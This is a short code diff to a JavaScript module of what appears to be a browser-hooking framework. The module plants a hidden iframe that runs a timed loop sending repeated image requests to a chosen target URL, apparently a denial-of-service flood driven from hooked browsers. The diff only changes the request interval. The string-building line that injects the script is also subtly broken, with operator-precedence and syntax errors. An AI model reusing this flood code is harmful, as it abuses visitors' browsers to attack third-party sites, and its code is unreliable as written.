@@ -3,7 +3,7 @@ var request = {
     url: module.params,
     body: '',
     type: 'application/x-www-form-urlencoded',
-    interval: 10,
+    interval: 100,
     random: true,
 }
 
@@ -100,7 +100,7 @@ if (injectify.info.platform === 'browser') {
                 interaction: false,
                 hidden: true
             }, function(element) {
-                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },' + request.interval + ')</script>'
+                element.srcdoc = '<script>setInterval(function(){ var url=' + JSON.stringify(target) + request.random ? '+"?"++new Date()' : '' + '; var req = new Image(); req.src=url; /* if (typeof window.fetch === "function") window.fetch(url); */ },' + request.interval * 4 + ')</script>'
             })
 
             /**
